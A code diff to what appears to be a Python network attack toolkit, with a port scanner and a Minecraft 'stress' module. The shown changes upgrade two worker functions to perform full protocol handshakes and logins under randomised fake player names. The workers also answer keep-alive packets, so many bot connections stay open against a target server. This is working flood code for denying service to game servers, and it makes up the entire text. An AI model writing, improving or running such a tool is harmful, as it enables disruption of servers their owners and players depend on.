@@ -2750,13 +2750,55 @@ def legacy_nmap(target):
     return open_ports
 
 
+def _mc_read_varint(sock):
+    v = 0
+    for i in range(5):
+        b = sock.recv(1)
+        if not b:
+            return None
+        v |= (b[0] & 0x7F) << (7 * i)
+        if not (b[0] & 0x80):
+            break
+    return v
+
+
 def mc_worker(ip, port, results, idx):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2.0); s.connect((ip, port))
-        s.sendall(MINECRAFT_PAYLOADS[idx % len(MINECRAFT_PAYLOADS)])
-        s.close(); results[idx] = 1
-    except Exception: results[idx] = 0
+        s.settimeout(5.0)
+        s.connect((ip, port))
+        handshake = _mc_packet(0x00, _mc_varint(764), _mc_pstr(ip), port.to_bytes(2, "big"), _mc_varint(2))
+        s.sendall(handshake)
+        username = f"Stress_{random.randint(10000,99999)}_{random.choice(['X','Pro','YT','OP','HD'])}"
+        login = _mc_packet(0x00, _mc_pstr(username))
+        s.sendall(login)
+        end = time.time() + 4
+        while time.time() < end:
+            try:
+                s.settimeout(1)
+                plen = _mc_read_varint(s)
+                if plen is None:
+                    break
+                pid = _mc_read_varint(s)
+                if pid is None:
+                    break
+                rest = plen - len(_mc_varint(pid))
+                data = b""
+                while len(data) < rest:
+                    chunk = s.recv(rest - len(data))
+                    if not chunk:
+                        break
+                    data += chunk
+                if pid == 0x21:
+                    s.sendall(_mc_packet(0x0F, data))
+            except socket.timeout:
+                continue
+            except Exception:
+                break
+        s.close()
+        results[idx] = 1
+    except Exception:
+        results[idx] = 0
 
 
 def stress_minecraft():
@@ -3787,16 +3829,21 @@ def _mc_bot_worker(host, port, results, idx):
         while time.time() < end:
             try:
                 s.settimeout(0.5)
-                v = 0
-                for i in range(5):
-                    b = s.recv(1)
-                    if not b: break
-                    v |= (b[0] & 0x7F) << (7 * i)
-                    if not (b[0] & 0x80): break
-                if v:
-                    pid_byte = s.recv(1)
-                    if pid_byte and pid_byte[0] == 0x21:
-                        s.sendall(_mc_packet(0x0F))
+                plen = _mc_read_varint(s)
+                if plen is None:
+                    break
+                pid = _mc_read_varint(s)
+                if pid is None:
+                    break
+                rest = plen - len(_mc_varint(pid))
+                data = b""
+                while len(data) < rest:
+                    chunk = s.recv(rest - len(data))
+                    if not chunk:
+                        break
+                    data += chunk
+                if pid == 0x21:
+                    s.sendall(_mc_packet(0x0F, data))
             except socket.timeout:
                 continue
             except Exception:
